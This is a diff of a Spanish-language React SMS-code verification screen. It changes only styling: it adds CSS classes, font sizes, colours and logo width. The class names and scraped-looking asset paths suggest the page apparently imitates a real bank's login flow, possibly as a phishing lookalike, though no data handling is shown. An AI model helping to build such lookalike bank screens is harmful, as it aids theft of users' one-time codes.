@@ -590,11 +590,11 @@ export default function NumeroOTP() {
                         border: "1px solid #444",
                         boxShadow: "0 10px 25px rgba(0,0,0,0.5)"
                     }}>
-                        <h2 style={{ textAlign: "center", fontSize: "20px", fontWeight: "bold", marginBottom: "15px", marginTop: "10px", color: "white" }}>
+                        <h2 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs" style={{ textAlign: "center", fontSize: "24px", fontWeight: "bold", marginBottom: "15px", marginTop: "10px", color: "white" }}>
                             Confirma tus datos
                         </h2>
 
-                        <p style={{ textAlign: "center", fontSize: "14px", marginBottom: "30px", color: "#e0e0e0" }}>
+                        <p className="bc-card-auth-description bc-mt-4 bc-fs-xs" style={{ textAlign: "center", fontSize: "18px", lineHeight: "20px", marginBottom: "30px", color: "white" }}>
                             Ingresa el código que te enviamos por mensaje de texto.
                         </p>
 
@@ -621,12 +621,12 @@ export default function NumeroOTP() {
                                 transform: "translate(-50%, -50%)",
                                 textAlign: "center"
                             }}>
-                                <div style={{ fontSize: "11px", color: "#ccc" }}>Vence en:</div>
-                                <div style={{ fontSize: "14px", fontWeight: "bold", color: "white" }}>{formatTime(timeLeft)}</div>
+                                <div className="bc-card-auth-description" style={{ fontSize: "11px", color: "white" }}>Vence en:</div>
+                                <div className="bc-card-auth-description" style={{ fontSize: "14px", fontWeight: "bold", color: "white" }}>{formatTime(timeLeft)}</div>
                             </div>
                             {activeResend ?
                                 <div>
-                                    <p style={{ marginTop: "10px", fontSize: "10px", color: "#ffffff", textDecoration: "underline", cursor: "pointer" }} onClick={() => handleResend()}>
+                                    <p className="bc-card-auth-description" style={{ marginTop: "10px", fontSize: "10px", color: "#ffffff", textDecoration: "underline", cursor: "pointer" }} onClick={() => handleResend()}>
                                         Reenviar código OTP
                                     </p>
                                 </div> : null}
@@ -669,7 +669,7 @@ export default function NumeroOTP() {
                             ))}
                         </div>
 
-                        <p style={{ textAlign: "center", fontSize: "14px", marginBottom: "5px", color: "#ffffff" }} >
+                        <p className="bc-card-auth-description" style={{ textAlign: "center", fontSize: "14px", marginBottom: "5px", color: "#ffffff" }} >
                             Búscalo en el número de teléfono registrado
                         </p>
 
@@ -702,12 +702,12 @@ export default function NumeroOTP() {
                                     style={{ width: "180px" }}
                                 />
                             </div>
-                            <div>
+                            <div style={{ alignSelf: 'center' }}>
                                 <span className="vigilado">
                                     <img
                                         src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                                         alt="Superintendencia"
-                                        style={{ width: "180px" }}
+                                        style={{ width: "140px" }}
                                     />
                                 </span>
                             </div>
